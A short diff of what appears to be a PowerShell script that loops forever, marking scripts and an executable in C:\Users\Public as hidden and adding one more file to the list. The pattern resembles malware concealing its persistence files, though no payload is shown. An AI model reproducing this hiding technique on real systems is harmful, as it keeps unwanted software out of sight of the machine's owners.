@@ -47,7 +47,8 @@ while ($true) {
 	attrib +h C:\Users\Public\MainWinStyle.ps1
 	attrib +h C:\Users\Public\MyStartUp.ps1
 	attrib +h C:\Users\Public\RNM.exe
-
+ 	attrib +h C:\Users\Public\tasl.ps1
+  	
     Start-Sleep -Seconds $verifyInterval
 
 
